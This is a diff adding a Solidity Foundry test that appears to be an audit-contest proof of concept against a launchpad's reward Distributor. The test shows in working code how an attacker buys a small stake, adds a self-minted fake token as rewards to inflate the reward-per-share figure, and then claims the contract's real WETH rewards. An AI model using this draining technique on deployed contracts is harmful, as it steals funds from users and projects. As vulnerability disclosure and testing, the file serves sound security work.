@@ -1,0 +1,168 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "./LaunchpadTestBase.sol";
+import {SafeTransferLib} from "@solady/utils/SafeTransferLib.sol";
+import "contracts/launchpad/libraries/RewardsTracker.sol";
+
+contract PoCLaunchpad is LaunchpadTestBase {
+    using SafeTransferLib for address;
+    /**
+     * PoC can utilize the following variables to access the relevant contracts:
+     * - factory: ERC1967Factory.sol
+     * - launchpad: Launchpad.sol
+     * - distributor: Distributor.sol
+     * - curve: SimpleBondingCurve.sol
+     * - launchpadLPVault: LaunchpadLPVault.sol
+     * - quoteToken: Quote token used in Launchpad system
+     * - uniV2Router: Uniswap V2 Router used in Launchpad system
+     */
+
+    function test_debug_submissionValidity() public {
+        // SETUP:
+        // WETH is quote token.
+        // LaunchPad pair new launch token with WETH
+        // 1. Developer launch new meme token. Users already hold 100M out of 800M token during bonding phase
+        // 2. Developer send in 5 WETH as incentive rewards for user bonding
+        // 3. attacker buy some share of the pair hold rewards and inflating rewards share price to drain rewards
+        // 4. attacker drain all 5 WETH rewards
+        
+        address launchTokenB = _launchToken();
+        {
+            address dev2 = makeAddr("dev2");
+            vm.startPrank(dev2);
+            //partial 10% launch with 10 ETH as maximum investment
+            uint256 investAmount = 10 ether;
+            quoteToken.mint(dev2, investAmount);
+            quoteToken.approve(address(launchpad), investAmount);
+            launchpad.buy(
+                ILaunchpad.BuyData({
+                    account: dev2,
+                    token: launchTokenB,
+                    recipient: dev2,
+                    amountOutBase: curve.bondingSupply(launchTokenB) / 10,
+                    maxAmountInQuote: investAmount // 8.695e17 quote token for 100M base token
+                })
+            );
+
+            //give token B some quote token rewards to drain
+            uint256 quoteTokenRewardAmount = 5 ether;
+            quoteToken.mint(dev2, quoteTokenRewardAmount);
+            quoteToken.approve(distributor, quoteTokenRewardAmount);
+            Distributor(distributor).addRewards(launchTokenB, address(quoteToken), 0, uint128(quoteTokenRewardAmount));
+            console.log("balanceOf distributor: %e", quoteToken.balanceOf(distributor));
+            //Token B have investment by users
+            // RewardPoolDataMemory memory rewardsPoolData = Distributor(distributor).getRewardsPoolData(launchTokenB);
+            _debugRewardPool(launchTokenB);
+
+            assertEq(quoteToken.allowance(dev2, distributor), 0);
+            // console.log("pendingQuoteRewards: %e", rewardsPoolData.pendingQuoteRewards);
+            //refresh pool rewards so each share have some rewards
+            // Distributor(distributor).claimRewards(launchTokenB);
+
+            _debugRewardPool(launchTokenB);
+            vm.stopPrank();
+        }
+
+        //3. Exploit
+        address exploiter = makeAddr("exploit");
+        quoteToken.mint(exploiter, 1 ether);
+        vm.startPrank(exploiter);
+        console.log("---Exploit Start---");
+
+        ERC20Harness mockToken = new ERC20Harness("FreeMint", "FF");
+        mockToken.mint(exploiter, type(uint256).max);
+        mockToken.approve(distributor, type(uint256).max);
+
+        console.log("**exploter starting QuoteToken balance: %e", quoteToken.balanceOf(exploiter));
+        //3.1 buy some share
+        quoteToken.approve(address(launchpad), type(uint256).max);
+        launchpad.buy(
+            ILaunchpad.BuyData({
+                account: exploiter,
+                token: address(launchTokenB),
+                recipient: exploiter,
+                amountOutBase: 100e18, // 100 tokens
+                maxAmountInQuote: 0.1 ether
+            })
+        );
+
+        //exploiter now have some stake of the pool
+        UserRewardData memory exploiterRewardData = Distributor(distributor).getUserData(launchTokenB, exploiter);
+        console.log("exploter shares: %e", exploiterRewardData.shares);
+
+        _debugRewardPool(launchTokenB);
+        //shareValue = totalReward * 1e12 / totalShares
+        // exploiter have 1e18 shares.
+        // it worth 1 shares worth 62500 quote token.
+        // we want to drain whole Distribution.sol contract have 40e18 quoteToken.
+        // -> inflate share price x = (40e18 / 62500) * totalShares / 1e12
+        console.log("inflate share value");
+        RewardPoolDataMemory memory rewardsPoolData = Distributor(distributor).getRewardsPoolData(launchTokenB);
+        console.log("Distributor Quote token balance to drain: %e", quoteToken.balanceOf(distributor));
+        console.log("rewardsPoolData.totalShares: %e", rewardsPoolData.totalShares);
+        console.log("exploiterRewardData.shares: %e", exploiterRewardData.shares);
+        console.log("exploiterRewardData.baseRewardDebt: %e", exploiterRewardData.baseRewardDebt);
+        console.log("exploiterRewardData.quoteRewardDebt: %e", exploiterRewardData.quoteRewardDebt);
+        // need increase accRewardsPerShare
+        // quote_to_drain =  ( userShare * newaccQuoteRewardsPerShare / 1e12)  - exploiterRewardData.quoteRewardDebt
+        //newAccQuoteRewardsPerShare = old_accQuoteRewardsPerShare + fake_token_in * 1e12 / totalShares = (quote_to_drain + exploiterRewardData.quoteRewardDebt ) * 1e12 / userShare
+        //x = fake_token_in = ((quote_to_drain + exploiterRewardData.quoteRewardDebt ) * 1e12 / userShare - old_accQuoteRewardsPerShare) * totalShares / 1e12
+        uint256 x = rewardsPoolData.totalShares
+            * (
+                quoteToken.balanceOf(distributor) + exploiterRewardData.quoteRewardDebt
+                    - (exploiterRewardData.shares * rewardsPoolData.accQuoteRewardPerShare) / 1e12
+            ) / exploiterRewardData.shares;
+        console.log("x: %e", x);
+        console.log("max x: %e %e", type(uint128).max, uint256(x * 1e12));
+
+        // 3.2 inflate share price by adding fake token as rewards
+        // there is underflow issue when sending too much token rewards it reach uint128 max limit
+        // It temporary solved by simply have much more share of the
+        while (x > 0) {
+            //need multiple rounds
+            console.log("multiple rounds %e", x);
+            uint128 roundAmount = type(uint128).max;
+            if (x < uint128(type(uint128).max)) roundAmount = uint128(x);
+            Distributor(distributor).addRewards(launchTokenB, address(mockToken), 0, roundAmount);
+            x -= roundAmount;
+        }
+        // Distributor(distributor).addRewards(address(launchTokenB), address(mockToken), 0, uint128(4e25));
+        _debugRewardPool(launchTokenB);
+
+        (uint256 baseAmount, uint256 quoteAmount) = Distributor(distributor).claimRewards(launchTokenB);
+        console.log("exploter claimed quoteAmount: %e", quoteAmount);
+        console.log("**exploter ending QuoteToken balance: %e", quoteToken.balanceOf(exploiter));
+
+        _debugRewardPool(launchTokenB);
+    }
+
+    function _debugRewardPool(address _token) internal view {
+        RewardPoolDataMemory memory rewardsPoolData = Distributor(distributor).getRewardsPoolData(_token);
+        console.log("-Debug Pool %s", ERC20Harness(_token).symbol());
+        console.log("-totalShares: %e", rewardsPoolData.totalShares);
+        console.log("-pendingBaseRewards: %e", rewardsPoolData.pendingBaseRewards);
+        console.log("-pendingQuoteRewards: %e", rewardsPoolData.pendingQuoteRewards);
+        console.log("-accBaseRewardPerShare: %e", rewardsPoolData.accBaseRewardPerShare);
+        console.log("-accQuoteRewardPerShare: %e", rewardsPoolData.accQuoteRewardPerShare);
+        console.log("");
+    }
+
+    function refreshShare(address _token) internal {
+        //refresh rewards by buy small amount token from launchPad
+        address randomUser = makeAddr("randomUser");
+        quoteToken.mint(randomUser, 1e18);
+        vm.startPrank(randomUser);
+        quoteToken.approve(address(launchpad), 1e18);
+        launchpad.buy(
+            ILaunchpad.BuyData({
+                account: randomUser,
+                token: _token,
+                recipient: randomUser,
+                amountOutBase: 1e1, // 10 tokens
+                maxAmountInQuote: 1e18
+            })
+        );
+        vm.stopPrank();
+    }
+}
